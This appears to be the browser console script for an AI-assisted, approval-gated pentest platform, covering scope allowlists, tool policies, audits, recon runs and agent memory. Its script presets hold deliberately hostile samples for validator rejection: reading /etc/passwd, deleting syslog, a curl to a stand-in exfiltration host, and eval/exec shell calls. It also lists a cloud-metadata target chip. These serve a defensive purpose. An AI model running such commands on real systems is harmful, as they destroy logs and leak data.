/* Redstrike v2 Web Console — Zero external dependencies, relative API calls only */
(() => {
  "use strict";

  const state = {
    token: sessionStorage.getItem("redgate_token") || "",
    engagementId: "ENG-LOCAL-LAB",
    me: null,
    toolPolicies: [],
    scriptPolicies: [],
    allowlist: [],
    skills: [],
    memories: [],
    modelHub: null,
    currentReconRun: null,
    demoProfiles: [],
    lastValidatedScriptId: null,
    refreshEpoch: 0,
  };

  const PROVIDER_DEFAULTS = {
    ollama: { url: "http://127.0.0.1:11434/v1", model: "qwen2.5-coder:14b" },
    lm_studio: { url: "http://127.0.0.1:1234/v1", model: "Qwen/Qwen2.5-Coder-14B-Instruct-GGUF" },
    openai_compatible: { url: "http://127.0.0.1:8080/v1", model: "qwen2.5-coder:14b" },
    mock: { url: "offline://mock", model: "redgate-offline-triage-v2" },
  };

  const TOOL_PARAM_TEMPLATES = {
    http_headers: { scheme: "http", method: "GET", port: 8000, path: "/probe/headers" },
    tls_inspect: { port: 443 },
    dns_lookup: { record_type: "A" },
    tcp_port_probe: { ports: [8000, 8001, 443] },
    nmap: { flags: ["-sV", "-T2", "--open"], ports: "80,443" },
    nmap_aggressive: { flags: ["-sV", "-T4", "--open"], ports: "80,443" },
    sqlmap: { flags: ["--batch", "--level=1"] },
    hydra: { flags: [] },
    john: { flags: ["--list=formats"] },
  };

  const MEMORY_PRESETS = {
    fp_csp: {
      type: "false_positive_rule",
      pattern: "missing:content-security-policy",
      title: "JSON-only API routes without HTML do not need browser CSP",
      content: "When auditing pure JSON endpoints with X-Content-Type-Options: nosniff, downgrade missing CSP to info to cut false-positive noise.",
    },
    meth_auth: {
      type: "methodology",
      pattern: "",
      title: "Always follow surface recon with manual auth/BOLA check",
      content: "Prioritize missing HSTS on authenticated endpoints and always perform manual human verification of IDOR/BOLA and session expiration.",
    },
    note_eng: {
      type: "target_note",
      pattern: "",
      title: "Reverse proxy terminates TLS upstream",
      content: "Confirm HSTS and TLS policies on external ingress proxy before escalating internal listener findings.",
    },
  };

  const SCRIPT_PRESETS = {
    py_bad: {
      lang: "python",
      code: 'import os\nimport subprocess\n\nos.system("cat /etc/passwd")\nsubprocess.run(["uname", "-a"])\n',
    },
    sh_bad: {
      lang: "bash",
      code: '#!/usr/bin/env bash\nrm -rf /var/log/syslog\ncurl -s https://evil-exfil.org/collect\n',
    },
    go_bad: {
      lang: "go",
      code: 'package main\n\nimport (\n\t"fmt"\n\t"os/exec"\n)\n\nfunc main() {\n\tout, _ := exec.Command("id").Output()\n\tfmt.Println(string(out))\n}\n',
    },
    js_bad: {
      lang: "javascript",
      code: 'const cp = require("child_process");\neval("cp.execSync(\'whoami\')");\n',
    },
    py_good: {
      lang: "python",
      code: 'import hashlib\nimport json\nfrom pathlib import Path\n\nreport = {\n    "check": "sandbox_confinement_verification",\n    "target": "127.0.0.1",\n    "digest": hashlib.sha256(b"redgate-verified").hexdigest()[:16],\n}\nPath("/tmp/sandbox/report.json").write_text(json.dumps(report), encoding="utf-8")\nprint(json.dumps(report, indent=2))\n',
    },
  };

  const $ = (id) => document.getElementById(id);

  function escapeHtml(str) {
    return String(str ?? "")
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;");
  }

  function flashToast(msg) {
    const el = $("toastBar");
    el.textContent = msg;
    el.hidden = false;
    clearTimeout(flashToast._t);
    flashToast._t = setTimeout(() => { el.hidden = true; }, 4500);
  }

  async function api(path, options = {}) {
    const headers = Object.assign({ "Content-Type": "application/json" }, options.headers || {});
    if (state.token) headers.Authorization = `Bearer ${state.token}`;
    try {
      const resp = await fetch(path, Object.assign({}, options, { headers }));
      const text = await resp.text(); // Consume once; Markdown exports are not JSON.
      let data;
      try { data = JSON.parse(text); } catch { data = { raw: text }; }
      return { ok: resp.ok, status: resp.status, data };
    } catch {
      return { ok: false, status: 0, data: { detail: "Network request failed. Check the service connection and retry." } };
    }
  }

  function setPill(id, label, ok) {
    const el = $(id);
    if (!el) return;
    el.textContent = label;
    el.className = "pill " + (ok ? "pill-ok" : "pill-err");
  }

  function setBanner(id, kind, text) {
    const el = $(id);
    if (!el) return;
    el.hidden = false;
    el.className = `status-banner status-${kind}`;
    el.textContent = text;
  }

  async function refreshHealth() {
    const { ok, data } = await api("/api/v1/health");
    if (!ok) return;
    setPill("pillGateway", "L1 Gateway: OK", data.gateway === "online");
    setPill("pillMcp", `L2 MCP: ${data.mcp_server?.status === "ok" ? "OK" : "Down"}`, data.mcp_server?.status === "ok");
    setPill("pillSandbox", `L3 Go: ${data.sandbox_runner?.status === "ok" ? "OK" : "Down"}`, data.sandbox_runner?.status === "ok");
    setPill("pillLlm", `AI: ${data.llm_proxy?.mode || "mock"}`, true);
    setPill("pillChain", `Audit: ${data.audit_chain?.valid ? "Verified" : "BROKEN"}`, Boolean(data.audit_chain?.valid));

    const gwPort = Number(data.gateway_port) || 8000;
    if (TOOL_PARAM_TEMPLATES.http_headers.port !== gwPort) {
      TOOL_PARAM_TEMPLATES.http_headers.port = gwPort;
      TOOL_PARAM_TEMPLATES.tcp_port_probe.ports = [gwPort, 443, 80];
      if ($("scanToolSelect")?.value === "http_headers") {
        $("scanParams").value = JSON.stringify(TOOL_PARAM_TEMPLATES.http_headers, null, 2);
      }
    }

    $("kpiAudit").textContent = String(data.audit_chain?.checked_entries ?? 0);
    const headHash = data.audit_chain?.head_hash || "";
    $("kpiChainHash").textContent = headHash ? `Head SHA-256: ${headHash.slice(0, 16)}...` : "SHA-256 verified";

    const items = Object.entries(data.validators || {});
    items.push(["local_ai_runtime", `${data.llm_proxy?.mode} (${data.llm_proxy?.model})`]);
    items.push(["go_prlimit_rlimits", Boolean(data.sandbox_runner?.prlimit_enabled)]);
    $("toolchainList").innerHTML = items.map(([k, v]) => {
      const okVal = typeof v === "boolean" ? v : true;
      const label = typeof v === "boolean" ? (v ? "READY" : "MISSING") : String(v);
      return `<div class="check-item"><span><code>${escapeHtml(k)}</code></span><span class="${okVal ? "check-pass" : "check-fail"}">${escapeHtml(label)}</span></div>`;
    }).join("");
  }

  async function refreshSessionAndData() {
    const epoch = ++state.refreshEpoch, token = state.token;
    await refreshHealth();
    if (!token || epoch !== state.refreshEpoch || token !== state.token) return;

    const meRes = await api("/api/v1/me");
    if (epoch !== state.refreshEpoch || token !== state.token) return;
    if (!meRes.ok) {
      state.me = null;
      window.RedstrikeWorkspace.reset();
      flashToast("Authentication failed. Provide a valid Bearer token.");
      return;
    }
    state.me = meRes.data;
    sessionStorage.setItem("redgate_token", state.token);
    $("whoamiName").textContent = meRes.data.operator_id;
    $("whoamiRole").textContent = meRes.data.role;
    $("whoamiRpm").textContent = `Rate limit: ${meRes.data.rate_limit_rpm} req/min`;

    const q = meRes.data.quota;
    $("quotaCallsText").textContent = `${q.used_calls} / ${q.max_calls}`;
    $("quotaTokensText").textContent = `${q.used_tokens} / ${q.max_tokens}`;
    $("quotaCallsBar").style.width = `${Math.min(100, (q.used_calls / Math.max(1, q.max_calls)) * 100)}%`;
    $("quotaTokensBar").style.width = `${Math.min(100, (q.used_tokens / Math.max(1, q.max_tokens)) * 100)}%`;

    const statusParam = $("auditStatusFilter").value
      ? `&status=${encodeURIComponent($("auditStatusFilter").value)}`
      : "";

    const [engRes, allowRes, polRes, aprRes, audRes, skillsRes, memRes, runsRes, hubRes] = await Promise.all([
      api("/api/v1/engagements"),
      api("/api/v1/allowlist"),
      api("/api/v1/policies"),
      api("/api/v1/approvals"),
      api(`/api/v1/audit?limit=60${statusParam}`),
      api("/api/v1/skills"),
      api(`/api/v1/memory?engagement_id=${encodeURIComponent(state.engagementId)}`),
      api("/api/v1/recon/runs"),
      api("/api/v1/models/hub"),
    ]);

    if (epoch !== state.refreshEpoch || token !== state.token) return;
    if (engRes.ok) renderEngagements(engRes.data.engagements || []);
    if (allowRes.ok) {
      state.allowlist = allowRes.data.allowlist || [];
      renderAllowlist();
    }
    if (polRes.ok) {
      state.toolPolicies = polRes.data.tool_policies || [];
      state.scriptPolicies = polRes.data.script_policies || [];
      renderPolicies();
    }
    if (aprRes.ok) renderApprovals(aprRes.data.approvals || []);
    if (audRes.ok) renderAudit(audRes.data.entries || []);
    if (skillsRes.ok) {
      state.skills = skillsRes.data.skills || [];
      renderSkills();
    }
    if (memRes.ok) {
      state.memories = memRes.data.memories || [];
      renderMemories();
    }
    $("kpiBrain").textContent = `${state.skills.filter((s) => s.enabled).length} / ${state.memories.filter((m) => m.active).length}`;
    if (runsRes.ok) renderReconHistory(runsRes.data.runs || []);
    if (hubRes.ok) {
      state.modelHub = hubRes.data;
      renderModelHub();
    }
    await window.RedstrikeWorkspace.refresh();
  }

  function renderEngagements(engs) {
    const sel = $("engagementSelect");
    const prev = state.engagementId;
    sel.innerHTML = engs.map((e) =>
      `<option value="${escapeHtml(e.id)}">${escapeHtml(e.id)} — ${escapeHtml(e.name)}</option>`
    ).join("");
    if (engs.some((e) => e.id === prev)) {
      sel.value = prev;
    } else if (engs.length) {
      state.engagementId = engs[0].id;
      sel.value = state.engagementId;
    }
    const cur = engs.find((e) => e.id === state.engagementId);
    if (cur) $("kpiEngagementName").textContent = `${cur.id}: ${cur.name}`;
  }

  function renderSkills() {
    const sel = $("reconSkillSelect");
    const prev = sel.value || "polyglot-sandbox-verify";
    sel.innerHTML = state.skills.filter((s) => s.enabled).map((s) =>
      `<option value="${escapeHtml(s.skill_id)}">${escapeHtml(s.name)} (${escapeHtml(s.skill_id)})</option>`
    ).join("");
    if (state.skills.some((s) => s.skill_id === prev)) sel.value = prev;
    updateReconSkillHint();

    $("skillsListBox").innerHTML = state.skills.map((s) => {
      const stages = (s.spec?.steps || []).map((st) => st.tool).join(" → ");
      return `
        <div class="quant-card">
          <div class="quant-head">
            <strong>${escapeHtml(s.name)}</strong>
            <span class="tag ${s.is_builtin ? "tag-low" : "tag-medium"}">${s.is_builtin ? "built-in" : "custom"}</span>
          </div>
          <div><code>${escapeHtml(s.skill_id)}</code> · ${escapeHtml(stages)}</div>
          <div style="color:var(--muted)">${escapeHtml(s.description)}</div>
        </div>
      `;
    }).join("");
  }

  function updateReconSkillHint() {
    const s = state.skills.find((x) => x.skill_id === $("reconSkillSelect").value);
    if (!s) return;
    $("reconSkillHint").textContent = s.description;
  }

  function renderMemories() {
    if (!state.memories.length) {
      $("memoryListBox").innerHTML = `<div class="check-item"><span style="color:var(--muted)">No memories saved yet. Use a Quick Teach preset above or review a recon finding.</span></div>`;
      return;
    }
    $("memoryListBox").innerHTML = state.memories.map((m) => `
      <div class="quant-card">
        <div class="quant-head">
          <span><span class="tag tag-low">${escapeHtml(m.memory_type)}</span> <strong>${escapeHtml(m.title)}</strong></span>
          <button type="button" class="btn btn-xs ${m.active ? "btn-ok" : "btn-ghost"}" data-toggle-mem="${m.id}" data-next="${m.active ? "0" : "1"}">${m.active ? "Active" : "Muted"}</button>
        </div>
        ${m.pattern_key ? `<div>Pattern: <code>${escapeHtml(m.pattern_key)}</code> · Scope: <code>${escapeHtml(m.engagement_id || "global")}</code></div>` : `<div>Scope: <code>${escapeHtml(m.engagement_id || "global")}</code></div>`}
        <div style="color:var(--muted)">${escapeHtml(m.content)}</div>
      </div>
    `).join("");

    $("memoryListBox").querySelectorAll("button[data-toggle-mem]").forEach((btn) => {
      btn.addEventListener("click", async () => {
        const res = await api(`/api/v1/memory/${btn.dataset.toggleMem}`, {
          method: "PATCH",
          body: JSON.stringify({ active: btn.dataset.next === "1" }),
        });
        if (res.ok) flashToast(`Memory #${btn.dataset.toggleMem} updated.`);
        await refreshSessionAndData();
      });
    });
  }

  function renderReconHistory(runs) {
    if (!runs.length) {
      $("reconHistoryList").innerHTML = `<div class="check-item"><span style="color:var(--muted)">No automated recon runs yet.</span></div>`;
      return;
    }
    $("reconHistoryList").innerHTML = runs.slice(0, 8).map((r) => {
      const st = r.summary_stats || {};
      return `
        <div class="check-item">
          <span>
            <code>${escapeHtml(r.run_id)}</code> · <strong>${escapeHtml(r.root_target)}</strong>
            <span style="color:var(--muted)">(${escapeHtml(r.skill_id)} · ${st.total_findings ?? 0} findings)</span>
          </span>
          <button type="button" class="btn btn-xs btn-secondary" data-open-run="${escapeHtml(r.run_id)}">Inspect</button>
        </div>
      `;
    }).join("");

    $("reconHistoryList").querySelectorAll("button[data-open-run]").forEach((btn) => {
      btn.addEventListener("click", () => loadReconRun(btn.dataset.openRun));
    });

    if (!state.currentReconRun && runs.length) {
      loadReconRun(runs[0].run_id);
    }
  }

  async function loadReconRun(runId) {
    const res = await api(`/api/v1/recon/runs/${encodeURIComponent(runId)}`);
    if (!res.ok) return;
    renderReconRunDetail(res.data.run);
  }

  function renderReconRunDetail(run) {
    state.currentReconRun = run;
    $("downloadReportBtn").hidden = false;
    const st = run.summary_stats || {};
    setBanner(
      "reconStatusBanner",
      "ok",
      `${run.run_id} · ${st.total_findings} findings (${st.dual_verified_count} dual-verified in Go Sandbox, ${st.suppressed_by_memory_count} adjusted by Memory, ${st.requires_human_judgment} require human judgment) · AI: ${run.llm_provider}`
    );
    $("reconReportPreview").textContent = run.report_markdown || "";

    const findings = run.findings || [];
    if (!findings.length) {
      $("reconFindingsBody").innerHTML = `<tr><td colspan="6" style="color:var(--muted)">No findings recorded for this run.</td></tr>`;
      return;
    }

    $("reconFindingsBody").innerHTML = findings.map((f) => {
      const confPct = Math.round(Number(f.ai_confidence || 0) * 100);
      const memBadge = f.suppressed_by_memory
        ? `<div style="margin-top:3px"><span class="tag tag-medium">${escapeHtml(f.suppressed_by_memory)}</span></div>`
        : "";
      const dualBadge = f.dual_verified ? ` <span class="tag tag-low">MCP + Go Verified</span>` : "";
      const curVerdict = f.analyst_verdict || "unreviewed";
      return `
        <tr>
          <td><strong>${f.priority_score}</strong></td>
          <td><span class="tag tag-${escapeHtml(f.severity)}">${escapeHtml(f.severity)}</span></td>
          <td>
            <strong>${escapeHtml(f.title)}</strong>${dualBadge}
            <div style="color:var(--muted);font-size:11.5px;margin-top:2px">${escapeHtml(f.evidence)}</div>
            ${memBadge}
          </td>
          <td><code>${confPct}%</code></td>
          <td style="font-size:11.5px;color:${f.requires_human_judgment ? "#fde68a" : "var(--muted)"}">
            ${f.requires_human_judgment ? "<strong>REQUIRED:</strong> " : ""}${escapeHtml(f.human_judgment_reason)}
          </td>
          <td>
            <div style="margin-bottom:4px"><span class="tag tag-${curVerdict === "confirmed" ? "low" : (curVerdict === "false_positive" ? "medium" : "pending")}">${escapeHtml(curVerdict)}</span></div>
            <div class="btn-row">
              <button type="button" class="btn btn-xs btn-ok" data-verdict-id="${f.id}" data-verdict="confirmed" data-learn="0">Confirm</button>
              <button type="button" class="btn btn-xs btn-secondary" data-verdict-id="${f.id}" data-verdict="false_positive" data-learn="1" title="Mark False Positive & teach Agent Memory">FP + Learn</button>
            </div>
          </td>
        </tr>
      `;
    }).join("");

    $("reconFindingsBody").querySelectorAll("button[data-verdict-id]").forEach((btn) => {
      btn.addEventListener("click", async () => {
        const fid = btn.dataset.verdictId;
        const verdict = btn.dataset.verdict;
        const learn = btn.dataset.learn === "1";
        const res = await api(`/api/v1/recon/findings/${fid}`, {
          method: "PATCH",
          body: JSON.stringify({
            verdict,
            note: `Human analyst review by ${state.me?.operator_id}`,
            learn_false_positive_rule: learn,
          }),
        });
        if (res.ok) {
          const learnedMsg = res.data.learned_memory
            ? ` & saved rule #${res.data.learned_memory.id} to Agent Memory!`
            : ".";
          flashToast(`Finding #${fid} marked '${verdict}'${learnedMsg}`);
          await loadReconRun(run.run_id);
          await refreshSessionAndData();
        }
      });
    });
  }

  function renderModelHub() {
    const hub = state.modelHub;
    if (!hub) return;
    const rt = hub.active_runtime || {};
    $("rtProvider").value = rt.active_provider || "mock";
    $("rtBaseUrl").value = rt.base_url || "http://127.0.0.1:11434/v1";
    $("rtModel").value = rt.active_model || "qwen2.5-coder:14b";
    if (rt.quantization) $("rtQuant").value = rt.quantization;

    const pOllama = hub.local_probes?.ollama || {};
    const pLms = hub.local_probes?.lm_studio || {};
    $("localProbeStatus").innerHTML = `
      <div class="check-item">
        <span>Active Engine: <code>${escapeHtml(rt.active_provider)}</code> · <code>${escapeHtml(rt.active_model)}</code> (${escapeHtml(rt.quantization)})</span>
        <span class="check-pass">ACTIVE</span>
      </div>
      <div class="check-item">
        <span>Ollama Daemon (<code>${escapeHtml(pOllama.url || ":11434")}</code>)</span>
        <span class="${pOllama.reachable ? "check-pass" : "check-fail"}">${pOllama.reachable ? `ONLINE (${pOllama.installed_models.length} models)` : "OFFLINE (run on your VM)"}</span>
      </div>
      <div class="check-item">
        <span>LM Studio Server (<code>${escapeHtml(pLms.url || ":1234")}</code>)</span>
        <span class="${pLms.reachable ? "check-pass" : "check-fail"}">${pLms.reachable ? `ONLINE (${pLms.installed_models.length} models)` : "OFFLINE (run on your VM)"}</span>
      </div>
    `;
  }

  function renderAllowlist() {
    const inEng = state.allowlist.filter((a) => a.engagement_id === state.engagementId && a.active);
    $("kpiAllowlist").textContent = String(inEng.length);

    const chips = inEng.map((a) =>
      `<button type="button" class="chip chip-ok" data-target="${escapeHtml(a.target.replace("*.", "api."))}">${escapeHtml(a.target)}</button>`
    );
    chips.push(`<button type="button" class="chip chip-danger" data-target="203.0.113.99">203.0.113.99 (out-of-scope)</button>`);
    chips.push(`<button type="button" class="chip chip-danger" data-target="169.254.169.254">169.254.169.254 (metadata)</button>`);
    $("scanTargetChips").innerHTML = chips.join("");
    $("scanTargetChips").querySelectorAll("button[data-target]").forEach((btn) => {
      btn.addEventListener("click", () => { $("scanTarget").value = btn.dataset.target; });
    });

    const canEdit = state.me && (state.me.role === "approver" || state.me.role === "admin");
    $("allowlistTableBody").innerHTML = state.allowlist.map((row) => `
      <tr>
        <td>#${row.id}</td>
        <td><code>${escapeHtml(row.engagement_id)}</code></td>
        <td><code>${escapeHtml(row.target)}</code></td>
        <td>${escapeHtml(row.description)}</td>
        <td>
          ${canEdit
            ? `<button class="btn btn-xs ${row.active ? "btn-ok" : "btn-ghost"}" data-toggle-allow="${row.id}" data-next="${row.active ? "0" : "1"}">${row.active ? "Active" : "Disabled"}</button>`
            : `<span class="tag ${row.active ? "tag-low" : "tag-rejected"}">${row.active ? "Active" : "Disabled"}</span>`
          }
        </td>
      </tr>
    `).join("");

    $("allowlistTableBody").querySelectorAll("button[data-toggle-allow]").forEach((btn) => {
      btn.addEventListener("click", async () => {
        const id = btn.dataset.toggleAllow;
        const active = btn.dataset.next === "1";
        const res = await api(`/api/v1/allowlist/${id}`, {
          method: "PATCH",
          body: JSON.stringify({ active }),
        });
        flashToast(res.ok ? `Allowlist #${id} set active=${active}` : `Error: ${JSON.stringify(res.data.detail)}`);
        await refreshSessionAndData();
      });
    });
  }

  function renderPolicies() {
    const sel = $("scanToolSelect");
    const prev = sel.value || "http_headers";
    sel.innerHTML = state.toolPolicies.map((t) => {
      const flag = !t.enabled ? " [DISABLED]" : (t.requires_approval ? " [APPROVAL GATED]" : " [ENABLED]");
      return `<option value="${escapeHtml(t.tool_name)}">${escapeHtml(t.tool_name)} (${escapeHtml(t.risk_level)})${flag}</option>`;
    }).join("");
    if (state.toolPolicies.some((t) => t.tool_name === prev)) sel.value = prev;
    updateScanToolHint();

    const isAdmin = state.me && state.me.role === "admin";
    $("toolPolicyTableBody").innerHTML = state.toolPolicies.map((t) => `
      <tr>
        <td><code>${escapeHtml(t.tool_name)}</code></td>
        <td><span class="tag tag-${escapeHtml(t.risk_level)}">${escapeHtml(t.risk_level)}</span></td>
        <td>${t.max_timeout}s</td>
        <td>${t.requires_approval ? '<span class="tag tag-medium">Required</span>' : '<span class="tag tag-low">Auto</span>'}</td>
        <td>
          ${isAdmin
            ? `<button class="btn btn-xs ${t.enabled ? "btn-ok" : "btn-danger"}" data-toggle-tool="${escapeHtml(t.tool_name)}" data-next="${t.enabled ? "0" : "1"}">${t.enabled ? "Enabled" : "Disabled"}</button>`
            : `<span class="tag ${t.enabled ? "tag-low" : "tag-rejected"}">${t.enabled ? "Enabled" : "Disabled"}</span>`
          }
        </td>
      </tr>
    `).join("");

    $("toolPolicyTableBody").querySelectorAll("button[data-toggle-tool]").forEach((btn) => {
      btn.addEventListener("click", async () => {
        const name = btn.dataset.toggleTool;
        const enabled = btn.dataset.next === "1";
        const res = await api(`/api/v1/policies/tools/${encodeURIComponent(name)}`, {
          method: "PATCH",
          body: JSON.stringify({ enabled }),
        });
        flashToast(res.ok ? `Updated tool '${name}' enabled=${enabled}` : `Denied: ${res.data.detail}`);
        await refreshSessionAndData();
      });
    });

    $("scriptPolicyGrid").innerHTML = state.scriptPolicies.map((sp) => `
      <div class="lang-card">
        <h4>${escapeHtml(sp.language)}</h4>
        <p><strong>Max runtime:</strong> ${sp.max_runtime_sec}s · <strong>Egress lock:</strong> ${sp.network_egress_allowlist ? "Allowlist only" : "Off"}</p>
        <p><strong>Allowed imports (${sp.allowed_imports.length}):</strong> ${escapeHtml(sp.allowed_imports.slice(0, 7).join(", "))}${sp.allowed_imports.length > 7 ? "…" : ""}</p>
        <p><strong>Forbidden rules:</strong> ${sp.forbidden_patterns.length} regex + AST/linter checks</p>
      </div>
    `).join("");
  }

  function updateScanToolHint() {
    const t = state.toolPolicies.find((x) => x.tool_name === $("scanToolSelect").value);
    if (t) $("scanToolHint").textContent = `${t.description} (max timeout: ${t.max_timeout}s)`;
  }

  function renderApprovals(items) {
    const pending = items.filter((a) => a.status === "pending").length;
    $("kpiPending").textContent = String(pending);
    const badge = $("pendingBadge");
    badge.textContent = String(pending);
    badge.hidden = pending === 0;

    const canApprove = state.me && (state.me.role === "approver" || state.me.role === "admin");
    if (!items.length) {
      $("approvalsTableBody").innerHTML = `<tr><td colspan="8" style="color:var(--muted)">No queued approval requests.</td></tr>`;
      return;
    }

    $("approvalsTableBody").innerHTML = items.map((a) => {
      const isSelf = state.me && a.requested_by === state.me.operator_id;
      let actionHtml = `<span style="color:var(--muted);font-size:11.5px">—</span>`;
      if (a.status === "pending") {
        if (!canApprove) {
          actionHtml = `<span style="color:var(--muted);font-size:11.5px">Switch to approver/admin</span>`;
        } else if (isSelf) {
          actionHtml = `<button class="btn btn-xs btn-ghost" data-decide="${escapeHtml(a.request_id)}" data-val="approved">Self-Approve (Blocked)</button>`;
        } else {
          actionHtml = `
            <button class="btn btn-xs btn-ok" data-decide="${escapeHtml(a.request_id)}" data-val="approved">Approve &amp; Run</button>
            <button class="btn btn-xs btn-danger" data-decide="${escapeHtml(a.request_id)}" data-val="rejected">Reject</button>
          `;
        }
      }
      return `
        <tr>
          <td><code>${escapeHtml(a.request_id)}</code></td>
          <td><code>${escapeHtml(a.engagement_id)}</code></td>
          <td><code>${escapeHtml(a.target)}</code></td>
          <td><code>${escapeHtml(a.tool_or_script)}</code></td>
          <td>${escapeHtml(a.requested_by)}</td>
          <td><span class="tag tag-${escapeHtml(a.status)}">${escapeHtml(a.status)}</span></td>
          <td>${escapeHtml(a.approved_by || "—")}</td>
          <td>${actionHtml}</td>
        </tr>
      `;
    }).join("");

    $("approvalsTableBody").querySelectorAll("button[data-decide]").forEach((btn) => {
      btn.addEventListener("click", async () => {
        const reqId = btn.dataset.decide;
        const decision = btn.dataset.val;
        const res = await api(`/api/v1/approvals/${encodeURIComponent(reqId)}/decide`, {
          method: "POST",
          body: JSON.stringify({
            decision,
            note: `Reviewed via Redstrike Console by ${state.me.operator_id}`,
            execute_immediately: true,
          }),
        });
        flashToast(res.ok ? `Request ${reqId} ${decision}.` : `Blocked (${res.status}): ${res.data.detail}`);
        await refreshSessionAndData();
      });
    });
  }

  function renderAudit(entries) {
    if (!entries.length) {
      $("auditTableBody").innerHTML = `<tr><td colspan="10" style="color:var(--muted)">No audit records matching filter.</td></tr>`;
      return;
    }
    $("auditTableBody").innerHTML = entries.map((e) => {
      const ts = (e.started_at || "").replace("T", " ").slice(0, 19);
      const summary = e.rejection_reason || e.stdout_summary || "—";
      const exitDur = e.exit_code !== null && e.exit_code !== undefined
        ? `exit=${e.exit_code} · ${e.duration_ms}ms`
        : `${e.duration_ms || 0}ms`;
      return `
        <tr>
          <td>#${e.id}</td>
          <td><code>${escapeHtml(ts)}</code></td>
          <td>${escapeHtml(e.operator_id)}</td>
          <td><code>${escapeHtml(e.engagement_id)}</code></td>
          <td><code>${escapeHtml(e.target)}</code></td>
          <td><code>${escapeHtml(e.tool_or_script)}</code>${e.language ? ` <span class="tag tag-low">${escapeHtml(e.language)}</span>` : ""}</td>
          <td><span class="tag tag-${escapeHtml(e.status)}">${escapeHtml(e.status)}</span></td>
          <td><code>${escapeHtml(exitDur)}</code></td>
          <td title="prev: ${escapeHtml(e.prev_hash)}&#10;hash: ${escapeHtml(e.entry_hash)}"><code>${escapeHtml((e.entry_hash || "").slice(0, 10))}…</code></td>
          <td>${escapeHtml(summary.slice(0, 150))}</td>
        </tr>
      `;
    }).join("");
  }

  function renderValidationChecks(validation) {
    const box = $("validationChecks");
    if (!validation?.checks) { box.innerHTML = ""; return; }
    box.innerHTML = validation.checks.map((c) => `
      <div class="check-item">
        <span><code>${escapeHtml(c.check)}</code> — ${escapeHtml(c.detail)}</span>
        <span class="${c.passed ? "check-pass" : "check-fail"}">${c.passed ? "PASS" : "FAIL"}</span>
      </div>
    `).join("");
  }

  function wireEvents() {
    document.querySelectorAll(".nav-item").forEach((btn) => {
      btn.addEventListener("click", () => {
        document.querySelectorAll(".nav-item").forEach((b) => b.classList.remove("active"));
        document.querySelectorAll(".tab-panel").forEach((p) => p.classList.remove("active"));
        btn.classList.add("active");
        $(`tab-${btn.dataset.tab}`).classList.add("active");
      });
    });

    $("engagementSelect").addEventListener("change", async (e) => {
      window.RedstrikeWorkspace.reset();
      state.currentReconRun = null;
      state.engagementId = e.target.value;
      const defaultTarget = state.engagementId === "ENG-LOCAL-LAB" ? "127.0.0.1" : "example.com";
      $("scanTarget").value = defaultTarget;
      $("genTarget").value = defaultTarget;
      $("valTarget").value = defaultTarget;
      $("reconTarget").value = defaultTarget;
      $("scanParams").value = JSON.stringify(
        defaultTarget === "127.0.0.1"
          ? { scheme: "http", method: "GET", port: TOOL_PARAM_TEMPLATES.http_headers.port, path: "/probe/headers" }
          : { scheme: "https", method: "HEAD", port: 443, path: "/" },
        null,
        2
      );
      await refreshSessionAndData();
    });

    $("roleSelect").addEventListener("change", async (e) => {
      window.RedstrikeWorkspace.reset();
      state.currentReconRun = null;
      state.me = null;
      state.token = e.target.value;
      const prof = state.demoProfiles.find((p) => p.token === state.token);
      if (prof) flashToast(`Switched session to ${prof.label}`);
      await refreshSessionAndData();
    });

    $("refreshAllBtn").addEventListener("click", refreshSessionAndData);
    $("refreshApprovalsBtn").addEventListener("click", refreshSessionAndData);
    $("auditStatusFilter").addEventListener("change", refreshSessionAndData);

    // Token dialog
    $("tokenModalBtn").addEventListener("click", () => $("tokenDialog").showModal());
    $("closeTokenDialog").addEventListener("click", () => $("tokenDialog").close());
    $("tokenDialogForm").addEventListener("submit", async (e) => {
      e.preventDefault();
      const val = $("manualTokenInput").value.trim();
      if (val) {
        window.RedstrikeWorkspace.reset();
        state.currentReconRun = null;
        state.me = null;
        state.token = val;
        $("manualTokenInput").value = "";
        $("tokenDialog").close();
        await refreshSessionAndData();
      }
    });

    // Recon Agent tab
    $("reconSkillSelect").addEventListener("change", updateReconSkillHint);
    $("reconRunForm").addEventListener("submit", async (e) => {
      e.preventDefault();
      const subs = $("reconSubdomains").value
        .split(",")
        .map((s) => s.trim())
        .filter(Boolean);
      setBanner("reconStatusBanner", "warn", "Executing bounded recon pipeline (Scope → Memory → Skill MCP + Sandbox → Triage)...");
      const res = await api("/api/v1/recon/run", {
        method: "POST",
        body: JSON.stringify({
          engagement_id: state.engagementId,
          target: $("reconTarget").value.trim(),
          skill_id: $("reconSkillSelect").value,
          candidate_subdomains: subs,
          queue_gated_followups: $("reconQueueFollowups").checked,
          operator_focus: $("reconFocus").value,
        }),
      });
      if (res.ok) {
        renderReconRunDetail(res.data.run);
        flashToast(`Recon run ${res.data.run.run_id} finished with prioritized report.`);
      } else {
        const msg = res.data?.detail?.message || res.data?.detail || JSON.stringify(res.data);
        setBanner("reconStatusBanner", "err", `Recon rejected (${res.status}): ${msg}`);
      }
      await refreshSessionAndData();
    });

    $("downloadReportBtn").addEventListener("click", () => {
      if (!state.currentReconRun) return;
      const blob = new Blob([state.currentReconRun.report_markdown || ""], { type: "text/markdown;charset=utf-8" });
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = `${state.currentReconRun.run_id}-report.md`;
      a.click();
      URL.revokeObjectURL(url);
    });

    // Skills & Memory tab
    document.querySelectorAll("button[data-mem-preset]").forEach((btn) => {
      btn.addEventListener("click", () => {
        const p = MEMORY_PRESETS[btn.dataset.memPreset];
        if (!p) return;
        $("memType").value = p.type;
        $("memPatternKey").value = p.pattern;
        $("memTitle").value = p.title;
        $("memContent").value = p.content;
      });
    });

    $("memoryForm").addEventListener("submit", async (e) => {
      e.preventDefault();
      const mType = $("memType").value;
      const res = await api("/api/v1/memory", {
        method: "POST",
        body: JSON.stringify({
          engagement_id: mType === "target_note" ? state.engagementId : null,
          memory_type: mType,
          title: $("memTitle").value.trim(),
          content: $("memContent").value.trim(),
          pattern_key: $("memPatternKey").value.trim() || null,
          tags: [mType],
        }),
      });
      if (res.ok) {
        $("memTitle").value = "";
        $("memContent").value = "";
        $("memPatternKey").value = "";
        flashToast(`Saved '${res.data.memory.title}' to Agent Memory. Run Recon to see it applied!`);
        await refreshSessionAndData();
      } else {
        flashToast(`Error (${res.status}): ${JSON.stringify(res.data.detail)}`);
      }
    });

    $("customSkillForm").addEventListener("submit", async (e) => {
      e.preventDefault();
